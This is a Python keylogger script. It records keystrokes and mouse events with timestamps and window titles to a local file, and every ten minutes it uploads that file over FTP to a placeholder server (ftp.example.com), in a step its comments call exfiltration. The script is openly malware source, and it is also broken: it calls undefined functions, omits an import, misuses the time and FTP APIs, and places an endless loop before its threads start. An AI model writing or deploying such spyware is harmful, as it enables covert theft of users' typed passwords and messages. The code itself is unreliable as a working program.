
import os
import time
import keyboard
from pynput import mouse
from win32api import *
from ftplib import FTP
import ssl

# set up global variables
log_file_path = 'keylogger_log.txt'
active_window_title = getActiveWindowTitle()

# log file creation
if not os.path.exists(log_file_path):
    open(log_file_path, 'w').close()

# setup keyboard listener
def keyboard_listener():
    with keyboard.Listener() as listener:
        for event in listener:
            if event.event_type == keyboard.Events.KEY_DOWN:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                log_entry = f'{timestamp} - {event.name} - {event.event_type} - {active_window_title}\n'
                append_to_log(log_entry)

# setup mouse listener
def mouse_listener():
    with mouse.Listener() as listener:
        for event in listener:
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f'{timestamp} - {event.name} - {event.event_type} - {active_window_title}\n'
            append_to_log(log_entry)

# function to append new entries into the log file
def append_to_log(new_entry):
    with open(log_file_path, 'a') as log_file:
        log_file.write(new_entry)

# send logs via FTP (Exfiltration)
def send_logs():
    ftp = FTP('ftp.example.com')
    ftp.login(user='username', passwd='password')
    file = open(log_file_path, 'rb')
    ftp.storbinary(f'STP/KEYLOGGER_LOG {log_file_path}', file)
    file.close()
    print("Log sent successfully.")

# schedule the function to send logs every 10 minutes (Exfiltration step)
send_logs_schedule = time.gmtime(10 * 60).time()
while True:
    if time.time() > send_logs_schedule:
        send_logs()
        send_logs_schedule = time.gmtime(10 * 60).time()

# execute the listeners
keyboard_listener_thread = threading.Thread(target=keyboard_listener)
mouse_listener_thread = threading.Thread(target=mouse_listener)

keyboard_listener_thread.start()
mouse_listener_thread.start()

